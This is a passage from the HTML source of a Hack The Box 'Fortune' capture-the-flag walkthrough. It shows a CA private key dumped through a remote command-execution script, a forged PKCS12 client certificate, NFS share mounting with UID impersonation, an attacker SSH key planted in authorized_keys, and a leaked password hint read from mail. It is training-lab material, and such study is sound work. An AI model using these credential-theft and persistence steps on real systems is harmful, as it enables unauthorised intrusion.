+miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY
+8F5PquwOz384mmQ/3k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I
+1Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+3
+OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG
+z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/8BCuEwNuMz9mHc9
+DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg
+z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv
+HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==
+-----END CERTIFICATE-----
+
+[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem
+[*] Result :
+
+
+-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-use-them-to-generate-a-pkcs12-certificate-to-access-the-https-service-with-openssl-we-can-do-it-with-a-single-command-&quot;&gt;We can use them to generate a &lt;code class=&quot;highlighter-rouge&quot;&gt;PKCS12&lt;/code&gt; certificate to access the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service. with &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; we can do it with a single command :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
+total 20
+drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
+drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
+-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
+-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
+root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
+Enter Export Password:
+Verifying - Enter Export Password:
+root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
+total 28
+drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
+drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
+-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
+-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
+-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
+root@kali:~/Desktop/HTB/boxes/fortune/cert# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-we-can-import-the-certificate-in-firefox-&quot;&gt;Now we can import the certificate in Firefox :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/8.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;after-removing-the-ssl-exception-it-will-ask-for-our-certificate-and-give-us-access-&quot;&gt;After removing the SSL exception it will ask for our certificate and give us access :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;elevated-network-access-nfs-user-flag&quot;&gt;Elevated Network Access, NFS, User Flag&lt;/h3&gt;
+&lt;h4 id=&quot;after-getting-access-to-https-this-message-is-whats-on-the-index-page-&quot;&gt;After getting access to &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; this message is what’s on the index page :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-didnt-know-what-authpf-was-so-i-searched-about-it&quot;&gt;I didn’t know what &lt;code class=&quot;highlighter-rouge&quot;&gt;authpf&lt;/code&gt; was so I searched about it.&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - &lt;a href=&quot;https://www.freebsd.org/cgi/man.cgi?query=authpf&amp;amp;apropos=0&amp;amp;sektion=8&amp;amp;manpath=FreeBSD+8.1-RELEASE+and+Ports&amp;amp;format=html&quot;&gt;freeBSD manual&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;so-basically-this-can-give-access-to-some-filtered-services-we-werent-allowed-to-access-before-to-use-it-we-need-a-key-and-luckily-we-can-generate-one-&quot;&gt;So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-3-users-on-the-box-i-tried-all-of-them-and-nfsuser-worked-&quot;&gt;We have 3 users on the box, I tried all of them and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-is-the-time-for-another-nmap-scan-&quot;&gt;Now is the time for another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-two-new-ports-8081-which-is-running-http-and-2049-which-is-running-nfs-the-http-service-gives-us-this-message-&quot;&gt;We have two new ports, 8081 which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;2049&lt;/code&gt; which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service gives us this message :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-probably-we-need-to-focus-on-nfs&quot;&gt;So probably we need to focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;.&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Network File System&lt;/strong&gt; (&lt;strong&gt;NFS&lt;/strong&gt;) is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Distributed_file_system&quot;&gt;distributed file system&lt;/a&gt; protocol originally developed by &lt;a href=&quot;https://en.wikipedia.org/wiki/Sun_Microsystems&quot;&gt;Sun Microsystems&lt;/a&gt; in 1984, allowing a user on a client &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer&quot;&gt;computer&lt;/a&gt; to access files over a &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer_network&quot;&gt;computer network&lt;/a&gt; much like local storage is accessed.  -&lt;a href=&quot;https://en.wikipedia.org/wiki/Network_File_System&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;i-used-the-rce-script-to-check-etcexports-and-the-only-thing-there-was-home-&quot;&gt;I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; script to check &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/exports&lt;/code&gt; and the only thing there was &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : cat /etc/exports
+[*] Result :
+
+/home
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;by-using-nfs-ls-which-is-a-part-of-the-package-libnfs-utils-we-can-successfully-list-the-directories-&quot;&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs-ls&lt;/code&gt; (which is a part of the package &lt;code class=&quot;highlighter-rouge&quot;&gt;libnfs-utils&lt;/code&gt;) we can successfully list the directories :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
+drwxr-xr-x  2  1002  1002          512 nfsuser
+drwxr-xr-x  5  1001  1001          512 bob
+drwxr-x---  3  1000  1000          512 charlie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-created-a-directory-called-it-mnt-and-mounted-the-nfs-share-in-it-&quot;&gt;I created a directory, called it &lt;code class=&quot;highlighter-rouge&quot;&gt;mnt&lt;/code&gt; and mounted the &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; share in it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt &amp;amp;&amp;amp; mount -t nfs fortune.htb:/home ./mnt
+root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
+total 12
+drwxr-xr-x 5 root root  512 Nov  3  2018 .
+drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
+drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
+drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
+drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
+root@kali:~/Desktop/HTB/boxes/fortune# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;however-i-couldnt-access-charlies-directory-&quot;&gt;However I couldn’t access &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt;’s directory :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
+root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
+-bash: cd: charlie: Permission denied
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-is-because-im-trying-with-root-whose-uid-is-0-&quot;&gt;This is because I’m trying with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; whose &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-the-way-nfs-permissions-work-i-need-to-have-the-same-uid-as-charlie-which-is-1000-&quot;&gt;And the way &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; permissions work I need to have the same &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;1000&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : id charlie
+[*] Result :
+
+uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-already-have-a-user-on-my-box-with-the-uid-1000-called-rick-&quot;&gt;I already have a user on my box with the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 1000 called &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
+uid=1000(rick) gid=1000(rick) groups=1000(rick)
+root@kali:~/Desktop/HTB/boxes/fortune/mnt#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;privilege-escalation-root-flag&quot;&gt;Privilege Escalation, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;first-thing-i-wanted-to-do-is-to-get-ssh-luckily-i-had-write-access-to-authorized_keys-&quot;&gt;First thing I wanted to do is to get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, luckily I had write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
+total 22
+drwxr-x--- 3 rick rick 512 Nov  6  2018 .
+drwxr-xr-x 5 root root 512 Nov  3  2018 ..
+-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
+-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
+-rw-r----- 1 rick rick 359 Oct 11  2018 .login
+-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
+-rw------- 1 rick rick 608 Nov  3  2018 mbox
+-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
+drwx------ 2 rick rick 512 Nov  2  2018 .ssh
+-r-------- 1 rick rick  33 Nov  3  2018 user.txt
+-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
+rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
+rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
+total 4
+drwx------ 2 rick rick 512 Nov  2  2018 .
+drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
+-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
+rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-used-ssh-keygen-to-generate-a-private-and-a-public-key-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; to generate a private and a public key :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
+root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
+Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|%B*  .           |
+|=O..  o .        |
+|++. .. . .       |
+|B o.. . .        |
+|=+...+ .S        |
+|+.o...o.         |
+|oo o  +..        |
+|+.o  E +.        |
+|%++.  ..         |
++----[SHA256]-----+
+root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
+root@kali:~/Desktop/HTB/boxes/fortune#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-wrote-my-public-key-to-authorized_keys-and-got-ssh-as-charlie-&quot;&gt;Then I wrote my public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali&quot; &amp;gt;&amp;gt; authorized_keys 
+rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
+rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
+Password: 
+root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
+OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+fortune$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;in-the-home-directory-of-charlie-there-was-a-file-called-mbox-which-had-an-email-from-bob-to-charlie-thanking-him-for-setting-up-pgadmin4-for-him-and-also-telling-him-that-he-set-the-dba-password-to-the-same-as-root-password-&quot;&gt;In the home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; there was a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mbox&lt;/code&gt; which had an email from &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; thanking him for setting up &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; for him and also telling him that he set the &lt;code class=&quot;highlighter-rouge&quot;&gt;dba&lt;/code&gt; password to the same as root password :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ ls -al
+total 44
+drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
+drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
+-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
+-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
+-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
+-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
+-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
+-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
+drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
+-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
+-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
+fortune$ cat mbox                                                                                                                                                                                                 
+From bob@fortune.htb Sat Nov  3 11:18:51 2018
+Return-Path: &amp;lt;bob@fortune.htb&amp;gt;
+Delivered-To: charlie@fortune.htb
+Received: from localhost (fortune.htb [local])
+        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
+        for &amp;lt;charlie@fortune.htb&amp;gt;;
+        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+From:  &amp;lt;bob@fortune.htb&amp;gt;
+Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+To: charlie@fortune.htb
+Subject: pgadmin4
+Message-ID: &amp;lt;196699abe1fed384@fortune.htb&amp;gt;
+Status: RO
+
+Hi Charlie,
+
+Thanks for setting-up pgadmin4 for me. Seems to work great so far.
+BTW: I set the dba password to the same as root. I hope you don't mind.
+
+Cheers,
+
+Bob
+
+fortune$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
